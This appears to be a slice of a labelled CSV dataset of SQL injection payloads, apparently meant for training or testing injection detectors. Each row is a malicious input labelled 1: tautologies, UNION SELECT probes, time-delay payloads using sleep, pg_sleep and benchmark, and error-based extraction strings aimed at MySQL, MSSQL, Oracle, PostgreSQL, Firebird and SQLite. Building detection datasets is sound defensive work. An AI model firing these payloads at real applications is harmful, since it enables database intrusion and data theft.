row_index,payload_norm,label,sqli_type_hint
6510,"1%' and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and '%' = '",1,
6511,"1'+ ( select 'midn' where 2819 = 2819 or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) ) +'",1,
6512,"1 ) where 8856 = 8856 or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1,
6513,"-5630"" ) or 3038 = 3038",1,
6514,"1' union all select null,null,null,null,null,null--",1,
6515,"1 ) where 9012 = 9012 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1,
6516,"1"" ) where 8657 = 8657",1,
6517,"-1302"" ) ) as rshr where 2800 = 2800 or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --",1,
6518,1 where 1519 = 1519,1,
6519,"1"" where 3080 = 3080 or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) --",1,
6520,1%' ) ) ) and ( 9404 = 8390 ) *8390 and ( ( ( '%' = ',1,
6521,"-2704"" ) union all select 1323,1323,1323,1323,1323,1323,1323,1323,1323--",1,
6522,"1%' ) ) and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( '%' = '",1,
6523,"1' ) ) ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( ( 'tzbp' = 'tzbp",1,
6524,1%' ) and 9198 = 9198--,1,
6525,"1"" ) ) and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( ""smnw"" like ""smnw",1,
6526,"1' ) ) ) and elt ( 2506 = 2383,2383 ) and ( ( ( 'bjrj' = 'bjrj",1,
6527,"1'|| ( select 'xasp' from dual where 4025 = 4025 and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) ) ||'",1,
6528,"1"" ) where 2837 = 2837 and ( 3020 = 3020 ) *6703--",1,
6529,1' ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( 'zaes' = 'zaes,1,
6530,"-4400 union all select 3983,3983,3983,3983,3983,3983,3983,3983,3983,3983--",1,
6531,"1'+ ( select jidy where 2989 = 2989 procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",1,
6532,"1' ) ) and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( 'tqpj' = 'tqpj",1,
6533,"1%' ) ) ) or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,
6534,"1 ) as ewnv where 3393 = 3393 and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,
6535,"-9751"" ) ) ) or 5929 = 3884--",1,
6536,"1'+ ( select 'bsva' where 4378 = 4378 or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) ) +'",1,
6537,1 and 6969 = ( select 6969 from pg_sleep ( 5 ) ),1,
6538,"1"" ) where 5005 = 5005 procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) --",1,
6539,"1%' ) or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and ( '%' = '",1,
